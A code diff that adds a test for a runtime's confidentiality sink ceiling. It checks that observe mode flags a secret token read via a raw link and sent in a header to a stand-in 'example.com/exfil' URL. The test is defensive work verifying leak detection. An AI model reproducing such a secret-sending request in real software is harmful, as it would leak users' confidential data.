@@ -153,6 +153,58 @@ describe("CFC sink ceiling on values pulled through schema-less links", () => {
     );
   });
 
+  it("emits the ceiling diagnostic for the same flow in observe mode", async () => {
+    // observe mode must still SEE the violation (the whole point of the
+    // relevance fix): without it the tx stays non-relevant and prepareCfc
+    // never runs, so observe would emit nothing and a deployment couldn't tell
+    // a link-laundered egress from a clean one. It commits (observe never
+    // rejects) but records the offending (sink, atom).
+    const observeStorage = StorageManager.emulate({ as: signer });
+    const observeRuntime = new Runtime({
+      apiUrl: new URL(import.meta.url),
+      storageManager: observeStorage,
+      cfcEnforcementMode: "observe",
+      cfcSinkMaxConfidentiality: { fetchData: [] },
+    });
+    try {
+      await seedConfidentialCell(observeRuntime, "observe-raw-read");
+      const tx = observeRuntime.edit();
+      const secret = observeRuntime.getCell(
+        space,
+        "observe-raw-read",
+        undefined,
+        tx,
+      );
+      const token = secret.key("secret").getRaw() as string;
+      expect(token).toBe("rosebud");
+      expect(tx.getCfcState().relevant).toBe(false);
+
+      enqueueSinkRequestPostCommitEffect(
+        tx,
+        "fetchData",
+        "fetchData:observe-raw-read",
+        createFrozenRequestSnapshot({
+          url: "https://example.com/exfil",
+          options: { headers: { "x-token": token } },
+        }),
+        "fetchData-start",
+        () => {},
+      );
+      observeRuntime.prepareTxForCommit(tx);
+      const result = await tx.commit();
+
+      expect(result.ok).toBeDefined();
+      expect(
+        tx.getCfcState().diagnostics.some((d) =>
+          d.includes("exceeds ceiling for fetchData") && d.includes("medical")
+        ),
+      ).toBe(true);
+    } finally {
+      await observeRuntime.dispose();
+      await observeStorage.close();
+    }
+  });
+
   it("never fires a fetchData pattern request carrying a labeled header (end-to-end)", async () => {
     setPatternEnvironment({
       apiUrl: new URL("http://mock-test-server.local"),
